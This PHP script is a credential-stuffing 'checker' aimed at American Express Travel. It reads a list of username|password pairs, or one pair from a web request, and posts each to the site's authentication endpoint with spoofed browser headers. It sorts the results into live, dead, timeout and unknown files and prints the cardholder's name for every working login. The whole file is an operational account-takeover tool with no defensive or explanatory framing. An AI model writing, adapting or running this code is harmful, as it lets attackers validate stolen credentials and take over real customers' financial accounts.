<?php
error_reporting(0);
require_once(__DIR__ . '/vendor/autoload.php');

use \Curl\Curl;

function save($type, $empas) {
  switch ($type) {
    case 'die':
      $file   = fopen('die.txt', 'a');
    break;
    case 'live':
      $file   = fopen('live.txt', 'a');
    break;
    case 'cant':
      $file   = fopen('timeout.txt', 'a');
    break;
    default:
      $file   = fopen('unknown.txt', 'a');
    break;
  }

  fwrite($file, $empas . PHP_EOL);
  fclose($file);
}

if (!isset($_REQUEST['empas']))
{
  $list     = explode("\n", str_replace("\r", "", file_get_contents('list.txt')));
  foreach ($list as $key => $mp) {

    $current  = $key+1;

    if (empty($mp)) { continue; }

    $split      = explode('|', $mp);
    $username   = (strpos($split[0], '@') === false) ? $split[0] : explode('@', $split[0])[0];
    $password   = $split[1];

    $curl   =  new Curl();

    $curl->setHeader('Host', 'travel.americanexpress.com');
    $curl->setHeader('Upgrade-Insecure-Requests', '1');
    $curl->setHeader('Origin', 'null');
    $curl->setHeader('Content-Type', 'application/x-www-form-urlencoded');
    $curl->setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36');
    $curl->setHeader('Sec-Fetch-User', '?1');
    $curl->setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9');

    $grabPage   = $curl->post('https://travel.americanexpress.com/travel/partner/subNav/login', http_build_query([
      'TLTSID'          =>  '561078985078016757'.rand(1000, 9999).'75781853780',
      'requestSource'   =>  'https://www.amextravel.com/flight-searches'
    ]));

    $curl->setHeader('Accept', 'application/json, text/javascript, */*; q=0.01');
    $curl->setHeader('X-Requested-With', 'XMLHttpRequest');
    $curl->setHeader('Content-Type', 'application/json');
    $curl->setHeader('Origin', 'https://travel.americanexpress.com');
    $curl->setHeader('Referer', 'https://travel.americanexpress.com/travel/partner/subNav/login');

    $postAmex   = $curl->post('https://travel.americanexpress.com/travel/partner/authenticate', '{"userId":"'.$username.'","password":"'.$password.'","requestSource":"https://www.amextravel.com/api/user?redirect=https%3A%2F%2Fwww.amextravel.com%2Ffeatured-hotel-searches","clientId":""}');

    if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === false) {

      echo $current . ' ' . $username . '|' . $password . ' - DIE ' . PHP_EOL;

      save('die', $username . '|' . $password);
    } else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === true) {

      echo $current . ' ' . $username . '|' . $password . ' - ' . $postAmex->cardMemberName . ' - LIVE ' . PHP_EOL;

      save('live', $username . '|' . $password);
    } else {

      echo $current . ' ' . $username . '|' . $password . ' - UNKOWN ' . PHP_EOL;

      save('unknown', $username . '|' . $password);
    }
  }
} else {
  $split      = explode('|', $_REQUEST['empas']);
  $username   = (strpos($split[0], '@') === false) ? $split[0] : explode('@', $split[0])[0];
  $password   = $split[1];
  if (empty($_REQUEST['empas']) || empty($username) || empty($password)) { die('GAADA EMPAS TOLOL'); }

  $curl   =  new Curl();

  $curl->setHeader('Host', 'travel.americanexpress.com');
  $curl->setHeader('Upgrade-Insecure-Requests', '1');
  $curl->setHeader('Origin', 'null');
  $curl->setHeader('Content-Type', 'application/x-www-form-urlencoded');
  $curl->setHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36');
  $curl->setHeader('Sec-Fetch-User', '?1');
  $curl->setHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9');

  $grabPage   = $curl->post('https://travel.americanexpress.com/travel/partner/subNav/login', http_build_query([
    'TLTSID'          =>  '561078985078016757'.rand(1000, 9999).'75781853780',
    'requestSource'   =>  'https://www.amextravel.com/flight-searches'
  ]));

  $curl->setHeader('Accept', 'application/json, text/javascript, */*; q=0.01');
  $curl->setHeader('X-Requested-With', 'XMLHttpRequest');
  $curl->setHeader('Content-Type', 'application/json');
  $curl->setHeader('Origin', 'https://travel.americanexpress.com');
  $curl->setHeader('Referer', 'https://travel.americanexpress.com/travel/partner/subNav/login');

  $postAmex   = $curl->post('https://travel.americanexpress.com/travel/partner/authenticate', '{"userId":"'.$username.'","password":"'.$password.'","requestSource":"https://www.amextravel.com/api/user?redirect=https%3A%2F%2Fwww.amextravel.com%2Ffeatured-hotel-searches","clientId":""}');
  if (!$postAmex) {
    $result = [
      'status'  =>  'TIMEOUT',
      'empas'   =>  $username . '|' . $password
    ];

    save('cant', $username . '|' . $password);
  } else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === false) {

    $result = [
      'status'  =>  'DIE',
      'empas'   =>  $username . '|' . $password
    ];

    save('die', $username . '|' . $password);
  } else if (isset($postAmex->errorBean->success) && $postAmex->errorBean->success === true) {

    $result = [
      'status'  =>  'LIVE',
      'empas'   =>  $username . '|' . $password
    ];

    save('live', $username . '|' . $password);
  } else {

    $result = [
      'code'    =>  $curl->getHttpStatusCode,
      'status'  =>  'UNKNOWN',
      'empas'   =>  $username . '|' . $password
    ];

    save('unknown', $username . '|' . $password);
  }

  die(json_encode($result));

}
